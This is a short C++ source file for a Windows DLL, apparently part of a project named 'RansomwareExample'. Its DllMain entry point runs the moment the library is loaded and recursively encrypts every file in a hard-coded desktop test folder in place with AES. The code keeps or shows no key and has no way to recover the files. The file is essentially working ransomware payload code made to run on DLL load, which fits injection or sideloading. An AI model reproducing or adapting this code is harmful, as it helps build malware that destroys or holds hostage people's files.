// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <windows.h>
#include <cstdlib>
#include "..\..\RansomwareExample\RansomwareExample\AESCrypto.h"
#include <boost\filesystem.hpp>
#include <iostream>
using namespace std;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		AESCrypto aes = AESCrypto();
		wstring path = L"C:\\Users\\irslambouf\\Desktop\\test";
		boost::filesystem::recursive_directory_iterator dir(path), end;
		while (dir != end) {
			try
			{
				unsigned char tag[16];
				string current = dir->path().string();
				wstring current_file = dir->path().wstring();
				cout << current << endl;
				aes.in_place_encrypt(current_file, tag);
				++dir;
			}
			catch (const boost::filesystem::filesystem_error& ex)
			{
				printf("PROBLEM PATH - %s\n", dir->path());
				printf("%s\n", ex.what());
			}
		}
		return 0;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

